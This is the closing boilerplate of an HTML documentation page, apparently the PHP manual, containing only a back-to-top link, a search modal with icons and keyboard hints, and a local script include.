<script type="module" src="/manual/en/js/interactive-examples.js"></script>

<a id="toTop" href="javascript:;"><span id="toTopHover"></span><img width="40" height="40" alt="To Top" src="/images/to-top@2x.png"></a>

<div id="search-modal__backdrop" class="search-modal__backdrop">
  <div
    role="dialog"
    aria-label="Search modal"
    id="search-modal"
    class="search-modal"
  >
    <div class="search-modal__header">
      <div class="search-modal__form">
        <div class="search-modal__input-icon">
          <!-- https://feathericons.com search -->
          <svg xmlns="http://www.w3.org/2000/svg"
            aria-hidden="true"
            width="24"
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            stroke-width="2"
            stroke-linecap="round"
            stroke-linejoin="round"
          >
            <circle cx="11" cy="11" r="8"></circle>
            <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
          </svg>
        </div>
        <input
          type="search"
          id="search-modal__input"
          class="search-modal__input"
          placeholder="Search docs"
          aria-label="Search docs"
        />
      </div>

      <button aria-label="Close" class="search-modal__close">
        <!-- https://pictogrammers.com/library/mdi/icon/close/ -->
        <svg
          xmlns="http://www.w3.org/2000/svg"
          aria-hidden="true"
          width="24"
          viewBox="0 0 24 24"
        >
          <path d="M19,6.41L17.59,5L12,10.59L6.41,5L5,6.41L10.59,12L5,17.59L6.41,19L12,13.41L17.59,19L19,17.59L13.41,12L19,6.41Z"/>
        </svg>
      </button>
    </div>
    <div
      role="listbox"
      aria-label="Search results"
      id="search-modal__results"
      class="search-modal__results"
    ></div>
    <div class="search-modal__helper-text">
      <div>
        <kbd>↑</kbd> and <kbd>↓</kbd> to navigate •
        <kbd>Enter</kbd> to select •
        <kbd>Esc</kbd> to close
      </div>
      <div>
        Press <kbd>Enter</kbd> without
        selection to search using Google
      </div>
    </div>
  </div>
</div>

</body>
</html>
